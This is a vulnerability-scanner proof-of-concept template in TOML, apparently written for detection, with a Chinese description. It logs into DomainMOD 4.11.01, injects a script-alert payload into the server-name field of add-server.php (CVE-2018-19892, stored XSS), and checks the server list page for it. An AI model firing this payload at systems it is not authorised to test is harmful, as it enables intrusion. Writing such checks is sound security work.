[info]
author = "AVE"
description = "验证 DomainMOD 4.11.01 后台 add-server.php 中 DisplayName 参数的存储型 XSS 漏洞。需先登录后台，在添加服务器时将 XSS 载荷注入 new_name 字段，然后访问服务器列表页面检查载荷是否被触发执行。"
id = "POC-AVE-2018-0156"
name = "DomainMOD 4.11.01 存储型跨站脚本漏洞 PoC"
severity = "medium"
tags = [
    "cve-2018-19892",
    "domainmod",
    "xss",
    "authenticated",
]
vuln_id = [
    "CVE-2018-19892",
    "AVE-2018-0156",
]

[poc]
logic = "all"

[[poc.requests]]
method = "POST"
path = "/{{BaseURL}}/"
protocol = "http"

[poc.requests.body]
content = "new_username={{username}}&new_password={{password}}"
type = "raw"

[poc.requests.headers]
Content-Type = "application/x-www-form-urlencoded"

[[poc.requests.matchers]]
expect = true
status = [200]
type = "status"

[[poc.requests]]
method = "POST"
path = "/{{BaseURL}}/admin/dw/add-server.php"
protocol = "http"

[poc.requests.body]
content = "new_name=%3Cscript%3Ealert%28document.domain%29%3C%2Fscript%3E&new_host=abc&new_protocol=https&new_port=2086&new_username=abc&new_api_token=255&new_hash=&new_notes="
type = "raw"

[poc.requests.headers]
Content-Type = "application/x-www-form-urlencoded"

[[poc.requests.matchers]]
expect = true
status = [200]
type = "status"

[[poc.requests]]
method = "GET"
path = "/{{BaseURL}}/admin/dw/servers.php"
protocol = "http"

[[poc.requests.matchers]]
expect = true
part = "body"
type = "word"
words = ['"><script>alert(document.domain)</script></a>']

[[poc.requests.matchers]]
expect = true
part = "header"
type = "word"
words = ["text/html"]

[[poc.requests.matchers]]
expect = true
status = [200]
type = "status"
